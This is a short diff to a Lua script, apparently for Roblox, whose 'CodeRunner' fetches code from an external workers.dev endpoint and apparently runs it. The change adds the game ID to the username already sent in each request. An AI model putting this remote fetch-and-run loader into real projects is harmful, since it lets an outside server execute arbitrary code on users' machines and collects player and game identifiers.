@@ -4,6 +4,7 @@ local CodeRunner = { isLooping = false }
 
 local SERVER_URL = "https://backend-server.114ace114.workers.dev/get-code"
 local username = Players.LocalPlayer and Players.LocalPlayer.Name or "Unknown"
+local currentUniverseId = tostring(game.GameId)
 
 local cacheString, cacheFunc = "", nil
 
@@ -12,7 +13,10 @@ function CodeRunner.fetchAndRun()
         Url = SERVER_URL,
         Method = "POST",
         Headers = { ["Content-Type"] = "application/json" },
-        Body = HttpService:JSONEncode({ username = username })
+        Body = HttpService:JSONEncode({ 
+            username = username,
+            gameId = currentUniverseId
+        })
     })
 
     if not success then return false end
